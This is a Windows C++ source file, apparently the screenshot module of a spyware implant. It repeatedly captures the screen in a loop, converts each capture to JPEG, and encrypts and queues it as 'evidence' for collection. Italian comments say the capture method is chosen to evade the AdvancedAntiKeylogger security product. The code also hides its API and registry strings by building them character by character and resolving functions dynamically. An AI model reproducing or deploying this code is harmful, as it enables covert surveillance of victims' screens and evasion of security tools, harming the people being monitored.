#include <Windows.h>
#include <gdiplus.h>

#include "screenshot.h"
#include "proto.h"
#include "zmem.h"
#include "utils.h"
#include "conf.h"
#include "globals.h"
#include "debug.h"

#pragma comment(lib, "Gdiplus")
using namespace Gdiplus;

typedef  HRESULT (WINAPI *CreateStreamOnHGlobal_p)(
  _In_   HGLOBAL hGlobal,
  _In_   BOOL fDeleteOnRelease,
  _Out_  LPSTREAM *ppstm
);

typedef HGLOBAL (WINAPI *GlobalFree_p)(
  _In_  HGLOBAL hMem
);

SCREENSHOT_LOGS lpScreenshotLogs[MAX_SCREENSHOT_QUEUE];

BOOL IsAero()
{
	HKEY hKey;
	DWORD composition=0, len=sizeof(DWORD);
	
	WCHAR strKey[] = { L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'D', L'W', L'M', L'\0' };
	if(RegOpenKeyEx(HKEY_CURRENT_USER, strKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
		return FALSE;

	WCHAR strVal[] = { L'C', L'o', L'm', L'p', L'o', L's', L'i', L't', L'i', L'o', L'n', L'\0' };
	if(RegQueryValueExW(hKey, strVal, NULL, NULL, (BYTE *)&composition, &len) != ERROR_SUCCESS) 
	{
		RegCloseKey(hKey);
		return FALSE;
	} 
	RegCloseKey(hKey);

	if (composition==0)
		return FALSE;
	
	return TRUE;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0;          // number of image encoders
   UINT  size = 0;         // size of the image encoder array in bytes
   
   ImageCodecInfo* pImageCodecInfo = NULL;

   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   pImageCodecInfo = (ImageCodecInfo*)(zalloc(size));
   if(pImageCodecInfo == NULL)
      return -1;  // Failure

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j) {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
         zfree(pImageCodecInfo);
         return j;  // Success
      }    
   }

   zfree(pImageCodecInfo);
   
   return -1;  // Failure
}

PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
{
	HGLOBAL hBuffer = NULL, hBufferDst = NULL;
	void *pBuffer = NULL, *pBufferDst = NULL;
	IStream *pStream = NULL, *pStreamDst = NULL;
	BYTE *dataptrDst = NULL;
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	CLSID   encoderClsid;
	Image *image = NULL;
	EncoderParameters encoderParameters;
	
	if (!sizeDst)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] no sizeDst!!\n");
		__asm int 3;
#endif
		return NULL;
	}
	*sizeDst = 0;
	
	if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) 
	{
		CoUninitialize();
#ifdef _DEBUG
		OutputDebugString(L"[!!] GdiplusStartup FAIL\n");
		__asm int 3;
#endif
		return NULL;
	}

	if (GetEncoderClsid(L"image/jpeg", &encoderClsid) == -1) {
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
#ifdef _DEBUG
		OutputDebugString(L"[!!] GetEncoderClsid FAIL\n");
		__asm int 3;
#endif
		return NULL;
	}
	
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;
   encoderParameters.Parameter[0].Value = &quality;

    hBuffer = GlobalAlloc(GMEM_MOVEABLE, imageSize);
	if (!hBuffer) 
	{
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
#ifdef _DEBUG
		OutputDebugString(L"[!!] No hBuffer\n");
		__asm int 3;
#endif
		return NULL;
	}
	
	pBuffer = GlobalLock(hBuffer);
	if (!pBuffer) 
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] No pBuffer\n");
		__asm int 3;
#endif
		GlobalFree(hBuffer);
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
		return NULL;
	}
	
	
	CopyMemory(pBuffer, dataptr, imageSize);
	CreateStreamOnHGlobal_p fpCreateStreamOnHGlobal = (CreateStreamOnHGlobal_p) GetProcAddress(LoadLibrary(L"ole32"), "CreateStreamOnHGlobal");  //FIXME: array

	GlobalFree_p fpGlobalFree = (GlobalFree_p) GetProcAddress(LoadLibrary(L"kernel32"), "GlobalFree");  //FIXME: array
    if (fpCreateStreamOnHGlobal(hBuffer, FALSE, &pStream) == S_OK) 
	{
		image = new Image(pStream);
		if (image) 
		{
			if (hBufferDst = GlobalAlloc(GMEM_MOVEABLE, imageSize)) 
			{
				if (pBufferDst = GlobalLock(hBufferDst)) 
				{
					if (fpCreateStreamOnHGlobal(hBufferDst, FALSE, &pStreamDst) == S_OK) 
					{
						if (image->Save(pStreamDst, &encoderClsid, &encoderParameters) == Ok) 
						{		
							
							ULARGE_INTEGER position;
							LARGE_INTEGER null_int;
							DWORD dummy;
							null_int.HighPart = null_int.LowPart = 0;
							if (pStreamDst->Seek(null_int, STREAM_SEEK_CUR, &position) == S_OK) 
							{
								if (dataptrDst = (BYTE *)zalloc(position.LowPart)) 
								{
									*sizeDst = position.LowPart;
									pStreamDst->Seek(null_int, STREAM_SEEK_SET, &position);
									pStreamDst->Read(dataptrDst, *sizeDst, &dummy);
								}
							}
						
						}
						pStreamDst->Release();
					
					}
					GlobalUnlock(hBufferDst);		
				}
				GlobalFree(hBufferDst);		
			}
			delete image;	
		}
		pStream->Release();
	}
	
	GlobalUnlock(hBuffer);
    fpGlobalFree(hBuffer);
	GdiplusShutdown(gdiplusToken);
	
    return dataptrDst;
}


PBYTE BmpToJpgLog(DWORD agent_tag, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality, PULONG uOut)
{
	PBYTE pBuffer = NULL;
	BITMAPFILEHEADER bmf = { };
	PBYTE source_bmp = NULL, dest_jpg = NULL;
	DWORD bmp_size, jpg_size;
	
	if (pBMI->biHeight * pBMI->biWidth * pBMI->biBitCount / 8 != cbData)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] != cbData\n");
		__asm int 3;
#endif
		return pBuffer;
	}

    bmf.bfType = 'MB';
    bmf.bfSize = cbBMI+ cbData + sizeof(bmf); 
    bmf.bfOffBits = sizeof(bmf) + cbBMI; 

	bmp_size = bmf.bfOffBits + cbData;
	if (!(source_bmp = (BYTE *)zalloc(bmp_size)))
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] malloc FAIL\n");
		__asm int 3;
#endif
		return pBuffer;
	}

	memcpy(source_bmp, &bmf, sizeof(bmf));
	memcpy(source_bmp + sizeof(bmf), pBMI, cbBMI);
	memcpy(source_bmp + sizeof(bmf) + cbBMI, pData, cbData);

	if (dest_jpg = JpgConvert(source_bmp, bmp_size, &jpg_size, quality)) 
	{
		pBuffer = (PBYTE) zalloc(jpg_size);
		memcpy(pBuffer, (PBYTE)dest_jpg, jpg_size);
		*uOut = jpg_size;
	}
	
	zfree(source_bmp);
	zfree(dest_jpg);
	
	return pBuffer;
}


PBYTE TakeScreenshot(PULONG uOut)
{
	PBYTE pScreenShotBuffer = NULL;
	HDC hdccap = 0, g_hScrDC = 0;
	HBITMAP hbmcap = 0;
	DWORD g_xscdim, g_yscdim, g_xmirr, g_ymirr, x_start;
	BITMAPINFOHEADER bmiHeader;
	DWORD *pdwFullBits = NULL;
	HGDIOBJ gdiold = 0; 
	BOOL is_aero;
	WINDOWINFO wininfo;
	int winx, winy;
	HWND grabwind;

	
	// Tutto il display. Viene calcolato dalla foreground window
	// per aggirare AdvancedAntiKeylogger
	grabwind = GetForegroundWindow();
	if (!grabwind)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] No grabwind\n");
//		__asm int 3;
#endif
		return pScreenShotBuffer;
	}
	
	// Se dobbiamo prendere lo schermo intero su Aero prende il DC dello 
	
	is_aero = IsAero();
	
	if (is_aero) 
	{
		g_hScrDC = GetDC(NULL);
		wininfo.cbSize = sizeof(wininfo);
		
		if (!GetWindowInfo(GetDesktopWindow(), &wininfo)) 
		{
			CHAR strFuncName[] = { 'R', 'e', 'l', 'e', 'a', 's', 'e', 'D', 'C', '\0' };
			typedef int (WINAPI *ReleaseDC_p)(HWND, HDC);
			ReleaseDC_p fpReleaseDC = (ReleaseDC_p) GetProcAddress(GetModuleHandle(L"user32"), strFuncName);  //FIXME: array

			if (g_hScrDC) 
				fpReleaseDC(NULL, g_hScrDC);

			return pScreenShotBuffer;
		}
		
		wininfo.rcClient.left = 0;
		wininfo.rcClient.top = 0;
		wininfo.rcClient.right = GetSystemMetrics(SM_CXSCREEN);
		wininfo.rcClient.bottom = GetSystemMetrics(SM_CYSCREEN);
		
	} 
	else
	{
		g_hScrDC = GetDC(grabwind);
		wininfo.cbSize = sizeof(wininfo);
		if (!GetWindowInfo(grabwind, &wininfo)) 
		{
			if (g_hScrDC) 
				ReleaseDC(grabwind, g_hScrDC);

			return pScreenShotBuffer;
		}
	}

	
	g_xscdim = GetSystemMetrics(SM_CXSCREEN);
	g_yscdim = GetSystemMetrics(SM_CYSCREEN);
	if (wininfo.dwExStyle & WS_EX_LAYOUTRTL) 
	{
		winx = -(g_xscdim - wininfo.rcClient.right);
		winy = -wininfo.rcClient.top;
		x_start = g_xscdim-1;
		g_xmirr = -g_xscdim;
		g_ymirr = g_yscdim;
	}
	else
	{
		winx = -wininfo.rcClient.left;
		winy = -wininfo.rcClient.top;
		x_start = 0;
		g_xmirr = g_xscdim;
		g_ymirr = g_yscdim;
	}

	// Alloca la bitmap di dimensione sicuramente superiore a quanto sara' 
	if (!(pdwFullBits = (DWORD *) zalloc(g_xscdim * g_yscdim * sizeof(DWORD)))) 
	{
		if (is_aero) 
		{
			if (g_hScrDC) 
				ReleaseDC(NULL, g_hScrDC);
		} 
		else
		{
			if (g_hScrDC) 
				ReleaseDC(grabwind, g_hScrDC);
		}

		return pScreenShotBuffer;
	}

	// Settaggi per il capture dello screen
	ZeroMemory(&bmiHeader, sizeof(BITMAPINFOHEADER));
	bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmiHeader.biWidth = g_xscdim;
	bmiHeader.biHeight = g_yscdim;
	bmiHeader.biPlanes = 1;
	bmiHeader.biBitCount = 16;
	bmiHeader.biCompression = BI_RGB;
	bmiHeader.biSizeImage = bmiHeader.biWidth * bmiHeader.biHeight * (bmiHeader.biBitCount/8);

	// Crea un DC memory
	hdccap = CreateCompatibleDC(NULL);
	hbmcap = CreateCompatibleBitmap(g_hScrDC, g_xscdim, g_yscdim);

	// Copia lo schermo nella bitmap
	gdiold = SelectObject(hdccap, hbmcap);

	//BitBlt(hdccap, 0, 0, g_xscdim, g_yscdim, g_hScrDC, -winx, -winy, SRCCOPY);

	StretchBlt(hdccap, x_start, 0, g_xmirr, g_ymirr, g_hScrDC, winx, winy, g_xscdim, g_yscdim, SRCCOPY);
	if (GetDIBits(hdccap, hbmcap, 0, g_yscdim, (BYTE *)pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS)) 
	{
		pScreenShotBuffer = BmpToJpgLog(PM_SCREENSHOT, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50, uOut);
	}
	
	// Rilascio oggetti....
	if (gdiold)
		DeleteObject(gdiold);
	if (hbmcap)   
		DeleteObject(hbmcap);
	if (hdccap)   
		DeleteDC(hdccap);
	if (is_aero) 
		if (g_hScrDC) 
			ReleaseDC(NULL, g_hScrDC);
	else
		if (g_hScrDC) 
			ReleaseDC(grabwind, g_hScrDC);

	zfree(pdwFullBits);
	
	return pScreenShotBuffer;
}


BOOL QueueScreenshotLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	if (!lpEvBuff || !dwEvSize)
		return FALSE;

	for (DWORD i=0; i<MAX_SCREENSHOT_QUEUE; i++)
	{
		if (lpScreenshotLogs[i].dwSize == 0 || lpScreenshotLogs[i].lpBuffer == NULL)
		{
			lpScreenshotLogs[i].dwSize = dwEvSize;
			lpScreenshotLogs[i].lpBuffer = lpEvBuff;

			return TRUE;
		}
	}

	return FALSE;
}

VOID ScreenshotMain()
{
	while (1)
	{
		if (bScreenShotThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] ScreenshotMain exiting\n");
#endif
			hScreenShotThread = NULL;
			return;
		}

		if (bCollectEvidences)
		{
			DWORD dwShotSize;
			WCHAR strProcName[] = { L'U', L'N', L'K', L'N', L'O', L'W', L'N', L'\0' };
			LPBYTE lpShotBuff = TakeScreenshot(&dwShotSize);

			if (lpShotBuff && dwShotSize)
			{
				DWORD dwHeaderSize = sizeof(SNAPSHOT_ADDITIONAL_HEADER) + (wcslen(strProcName)*sizeof(WCHAR))*2;
				PSNAPSHOT_ADDITIONAL_HEADER lpSnapHeader = (PSNAPSHOT_ADDITIONAL_HEADER) zalloc(dwHeaderSize);

				lpSnapHeader->uProcessNameLen = wcslen(strProcName)*sizeof(WCHAR);
				lpSnapHeader->uWindowNameLen = wcslen(strProcName)*sizeof(WCHAR);
				lpSnapHeader->uVersion = LOG_SNAP_VERSION;
				memcpy((LPBYTE)lpSnapHeader + sizeof(SNAPSHOT_ADDITIONAL_HEADER), strProcName, lpSnapHeader->uProcessNameLen);
				memcpy((LPBYTE)lpSnapHeader + sizeof(SNAPSHOT_ADDITIONAL_HEADER) + lpSnapHeader->uProcessNameLen, strProcName, lpSnapHeader->uWindowNameLen);

				DWORD dwEvSize;
				LPBYTE lpEvBuffer = PackEncryptEvidence(dwShotSize, lpShotBuff, PM_SCREENSHOT, (LPBYTE)lpSnapHeader, dwHeaderSize, &dwEvSize);
				zfree(lpSnapHeader);
				zfree(lpShotBuff);

				if (!QueueScreenshotLog(lpEvBuffer, dwEvSize))
					zfree(lpEvBuffer);
			}
			else
			{
			//	if (lpShotBuff)
			//	{
//#ifdef _DEBUG
//					__asm int 3;
//#endif
//					zfree(lpShotBuff);
//				}
			}

		}
		MySleep(ConfGetRepeat(L"screenshot"));  //FIXME: array
	}
}
